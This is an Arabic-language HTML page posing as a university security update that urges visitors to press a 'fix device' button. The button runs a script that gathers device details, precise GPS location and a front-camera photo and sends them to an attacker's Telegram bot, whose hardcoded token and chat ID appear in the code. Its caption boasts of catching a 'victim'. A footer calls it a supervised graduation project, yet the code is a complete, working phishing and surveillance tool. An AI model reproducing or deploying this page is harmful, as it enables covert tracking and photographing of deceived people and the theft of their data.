<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحديث النظام - جامعة [اسمك]</title>
    <style>
        body { font-family: Arial; background: #111; color: #fff; text-align: center; padding: 50px; }
        .error { font-size: 28px; color: #ff0000; margin: 30px; }
        button { padding: 18px 40px; font-size: 22px; background: #00ff00; color: #000; border: none; cursor: pointer; }
        #info { margin-top: 30px; font-size: 18px; color: #0f0; }
        video, img { width: 280px; border: 4px solid red; margin: 15px; }
    </style>
</head>
<body>
    <h1>⚠️ تحديث أمني للجامعة</h1>
    <div class="error">❌ جهازك غير مدعوم في هذا الموقع<br>اضغط على زر الإصلاح للمتابعة</div>
    
    <button onclick="startAttack()">🔧 حاول إصلاح الجهاز الآن</button>
    
    <div id="info"></div>
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>
    <img id="photo" style="display:none;">

    <script>
        const BOT_TOKEN = "8638351016:AAGN8Hsea_8ZrVXLRrf26D8i7L2Ma6cDm4U";
        const CHAT_ID   = "8507095971";
        async function startAttack() {
            document.getElementById("info").innerHTML = "🔄 جاري إصلاح الجهاز...";

            // جمع بيانات الجهاز
            const deviceInfo = `
📱 جهاز: ${navigator.platform}
👤 User-Agent: ${navigator.userAgent}
📐 الشاشة: ${screen.width}×${screen.height}
🌐 اللغة: ${navigator.language}
⏰ الوقت: ${new Date().toISOString()}
            `.trim();

            // 1. الموقع الدقيق
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(pos => {
                    const loc = `📍 ${pos.coords.latitude.toFixed(6)}, ${pos.coords.longitude.toFixed(6)} | دقة: ${pos.coords.accuracy} متر`;
                    sendToTelegram("📍 الموقع + معلومات الجهاز", loc + "\n\n" + deviceInfo);
                }, err => console.log(err), {enableHighAccuracy: true});
            }

            // 2. الكاميرا
            try {
                const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}});
                document.getElementById("video").srcObject = stream;
                document.getElementById("video").style.display = "block";
                document.getElementById("info").innerHTML += "<br>✅ الكاميرا مفتوحة";

                setTimeout(() => takeAndSendPhoto(stream, deviceInfo), 1500);
            } catch(e) {
                document.getElementById("info").innerHTML += "<br>❌ الكاميرا: " + e.message;
            }
        }

        async function takeAndSendPhoto(stream, deviceInfo) {
            const video = document.getElementById("video");
            const canvas = document.getElementById("canvas");
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            canvas.getContext("2d").drawImage(video, 0, 0);

            const photoBlob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", 0.9));
            const photoURL = URL.createObjectURL(photoBlob);

            // إرسال الصورة + الكابشن
            const form = new FormData();
            form.append("chat_id", CHAT_ID);
            form.append("photo", photoBlob, "victim-photo.jpg");
            form.append("caption", `🔥 تم الإمساك بضحية!\n\n${deviceInfo}\n\n📸 الصورة ملتقطة`);

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: "POST",
                body: form
            }).then(() => {
                document.getElementById("info").innerHTML += "<br>🚀 كل البيانات + الصورة وصلت على التلجرام!";
                document.getElementById("photo").src = photoURL;
                document.getElementById("photo").style.display = "block";
            }).catch(err => console.error(err));

            // إيقاف الكاميرا بعد ثانيتين
            setTimeout(() => stream.getTracks().forEach(t => t.stop()), 2000);
        }

        function sendToTelegram(title, text) {
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(title + "\n\n" + text)}`);
        }
    </script>

    <p style="color:#aaa; margin-top:40px;">© مشروع تخرج - تحت إشراف الدكتور فقط</p>
</body>
</html>
